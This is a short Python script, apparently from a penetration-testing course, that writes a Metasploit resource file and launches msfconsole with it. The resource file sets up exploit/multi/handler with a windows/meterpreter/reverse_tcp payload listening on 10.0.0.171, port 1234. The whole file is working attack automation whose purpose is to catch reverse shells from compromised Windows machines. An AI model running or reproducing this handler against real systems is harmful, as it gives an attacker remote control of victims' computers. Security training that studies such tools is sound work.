#!/usr/bin/env python3

# Script:                   Python Metasploit
# Author:                   Courtney Hans
# Date of latest revision:  11/3/20
# Purpose:                  Python meterpreter

# Import libraries
import os, sys


def establish(metafile):
	metafile.write('use exploit/multi/handler\n')
	metafile.write('set payload windows/meterpreter/reverse_tcp\n')
	metafile.write('set LHOST 10.0.0.171\n') # listening host
	metafile.write('set LPORT 1234\n') # set port 1234 as the listener 
	metafile.write('run\n')

metafile=open('meta.rc','w')
establish(metafile)
metafile.close()
os.system('msfconsole -r meta.rc')
